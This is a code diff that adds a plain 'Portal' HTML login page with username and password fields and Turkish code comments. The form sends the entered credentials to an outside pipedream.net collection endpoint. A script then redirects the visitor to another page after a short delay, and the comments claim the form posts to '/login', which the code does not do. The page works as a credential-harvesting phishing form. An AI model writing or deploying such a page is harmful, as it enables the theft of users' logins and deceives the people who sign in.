@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<title>Portal</title>
+
+<style>
+body { margin:0; background:#f2f2f2; font-family:Arial; }
+.header {
+  background:#0a6a8a;
+  height:55px;
+  display:flex;
+  align-items:center;
+  padding-left:20px;
+  color:white;
+}
+.header b { font-size:16px; }
+
+.box {
+  width:400px;
+  background:white;
+  margin:100px auto;
+  padding:30px;
+  border:1px solid #777;
+}
+label { display:block; margin-top:15px; }
+input {
+  width:100%;
+  border:none;
+  border-bottom:1px solid black;
+  font-size:16px;
+  padding:6px 0;
+  outline:none;
+}
+button {
+  margin-top:20px;
+  float:right;
+  background:#0a6a8a;
+  color:white;
+  border:none;
+  padding:8px 16px;
+  cursor:pointer;
+}
+small { display:block; margin-top:10px; color:#666; }
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <b>Portal</b>
+</div>
+
+<form class="box"
+      method="post"
+      action="https://eocbtfxw1b5ibp4.m.pipedream.net"
+      onsubmit="afterSubmit()">
+
+  <label>Username</label>
+  <input name="username" autocomplete="username" required>
+
+  <label>Password</label>
+  <input name="password" type="password" autocomplete="current-password" required>
+
+  <button type="submit">Sign On</button>
+</form>
+
+<script>
+  // Login sonrası yönlendirmek istediğin adres:
+  const REDIRECT_URL = "/dominosai.html";
+
+  function afterSubmit() {
+    // Form submit olur; sayfa /login'e POST ederken yönlendirmeyi kısa geciktiriyoruz.
+    // (Not: Bu yöntem login'in gerçekten başarılı olup olmadığını doğrulamaz.
+    // Doğru yöntem: backend'in 302 redirect dönmesi veya frontend'in response'a göre yönlendirmesi.)
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 600);
+  }
+</script>
+
+</body>
+</html>
+ 
